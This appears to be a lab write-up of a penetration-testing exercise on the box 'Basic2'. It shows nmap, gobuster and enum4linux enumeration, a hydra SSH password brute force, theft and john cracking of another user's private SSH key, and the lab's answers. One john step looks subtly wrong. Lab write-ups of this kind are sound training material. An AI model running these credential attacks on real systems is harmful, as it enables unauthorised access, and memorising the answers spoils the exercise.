First thing i done after deploying machine, was nmap scan to look for open ports:

```
$sudo nmap  -A -v <target_ip>


PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 28:4a:0b:06:e8:be:40:d3:65:4c:61:6f:97:c3:4f:6f (RSA)
|   256 0b:d7:5a:11:15:9e:10:14:07:3c:12:23:33:70:8a:28 (ECDSA)
|_  256 a6:62:1c:cf:9a:c0:25:cf:25:46:66:05:5f:fe:d3:76 (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Uptime guess: 11.695 days (since Thu Jun 26 18:44:15 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2025-07-08T16:24:52
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

From here i found that this ip has smb service in 139 445 ports, i'll work with it later

so after that i used gobuster to look for hidden directories in http service:
```
 gobuster dir -u <target_ip>  -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/development          (Status: 301) [Size: 320] [--> http://10.10.253.117/development/]
/index.html           (Status: 200) [Size: 158]
```
So the hidden directory is: `development`

My next step is to use `samba smd enuaration` to get username, so i could use hydra to brutforce password

I'll use`enum4linux`
```
$ enum4linux -r <target_ip>
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul  8 20:29:05 2025

 =========================================( Target Information )=========================================
                                                                                                                    
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on IP)
                                                                                                                    
                                                                                                                    
[+] Got domain/workgroup name: WORKGROUP                                                                            
                                                                                                                    
                                                                                                                    
                                                                                                                    
                                                                                                                    
[+] Server 10.10.253.117 allows sessions using username '', password ''                                             
                                                                                                                    
                                                                                                                    
 ================================( Getting domain SID )================================
                                                                                                                    
Domain Name: WORKGROUP                                                                                              
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                
                                                                                                                    
                                                                                                                    
 ==================( Users IP via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                    
                                                                                                                    
[I] Found new SID:                                                                                                  
S-1-22-1                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''        
                                                                                                                    
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)                                            
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                         
                                                                                                                    
S-1-22-1-1000 Unix User\kay (Local User)                                                                            
S-1-22-1-1001 Unix User\jan (Local User)
S-1-22-1-1002 Unix User\ubuntu (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                         
                                                                                                                    
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                   
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
^C
```
Boom! I find 2 users jan and kay

What is the username?
Answer:jan

as said before i use hydra to brutforce password

```
hydra -V -t 16 -l jan -P /usr/share/wordlists/rockyou.txt -f ssh://<target_ip>

[ATTEMPT] target 10.10.146.129 - login "jan" - pass "lovely1" - 776 of 14344401 [child 6] (0/2)
[ATTEMPT] target 10.10.146.129 - login "jan" - pass "rocky" - 777 of 14344401 [child 7] (0/2)
[ATTEMPT] target 10.10.146.129 - login "jan" - pass "daddy" - 778 of 14344401 [child 9] (0/2)
[ATTEMPT] target 10.10.146.129 - login "jan" - pass "catdog" - 779 of 14344401 [child 11] (0/2)
[ATTEMPT] target 10.10.146.129 - login "jan" - pass "armando" - 780 of 14344401 [child 12] (0/2)
[ATTEMPT] target 10.10.146.129 - login "jan" - pass "margarita" - 781 of 14344401 [child 8] (0/2)
[ATTEMPT] target 10.10.146.129 - login "jan" - pass "151515" - 782 of 14344401 [child 10] (0/2)
[22][ssh] host: 10.10.146.129   login: jan   password: armando
[STATUS] attack finished for 10.10.146.129 (valid pair found)
```
YEP! I find password

What is the password?
Answer:armando

What service do you use to access the server(answer in abbreviation in all caps)?
Answer:SSH

I use SSH to connect to server as jan

```
SSH jan@<target_ip>

```
after connecting to the server i started to searching for flags:
```
an@ip:~$ ls
jan@ip:~$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Jul  8 12:23 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst
jan@ip:~$ cd ..
jan@ip:/home$ ls
jan  kay  ubuntu
jan@ip:/home$ ls -al
total 20
drwxr-xr-x  5 root   root   4096 Jul  8 12:23 .
drwxr-xr-x 24 root   root   4096 Jul  8 12:23 ..
drwxr-xr-x  2 root   root   4096 Apr 23  2018 jan
drwxr-xr-x  5 kay    kay    4096 Apr 23  2018 kay
drwxr-xr-x  3 ubuntu ubuntu 4096 Jul  8 12:23 ubuntu
jan@ip:/home$ cd kay
jan@ip:/home/kay$ ls -al
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Jul  8 12:23 ..
-rw------- 1 kay  kay   789 Jun 22 13:41 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo

jan@ip:/home/kay$ cd .ssh
jan@ip:/home/kay/.ssh$ ls -al
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

i that directory i find ssh key i copy `id_rsa` to local machine  to create a private key

 
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa > id_rsa.hash
Using default input encoding: UTF-8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:24 58.16% (ETA: 12:04:23) 0g/s 262144p/s 13019Kc/s 13019KC/s ledetgirl..ejdac4osito
0g 0:00:00:58 DONE (2025-07-08 12:04) 0g/s 246420p/s 12074Kc/s 12074KC/s 32110024..*7¡Vamos!
Session completed. 

─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash         
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2025-07-08 12:08) 50.00g/s 4137Kp/s 4137Kc/s 4137KC/s bird..bammer
Use the "--show" option to display all of the cracked passwords reliably
```
so passphrase to private key is `beeswax`

let's try to connect to kay machine, but first we need to change `id_rsa` permission so ssh could read it

```
$sudo chmod 600 id_rsa


$ssh -i id_rsa kay@10.10.253.117

Enter passphrase for key 'id_rsa': beeswax

```
now lets get last flag:

```
kay@ip:~$ ls
pass.bak
kay@ip:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

What is the final password you obtain?
Answer:heresareallystrongpasswordthatfollowsthepasswordpolicy
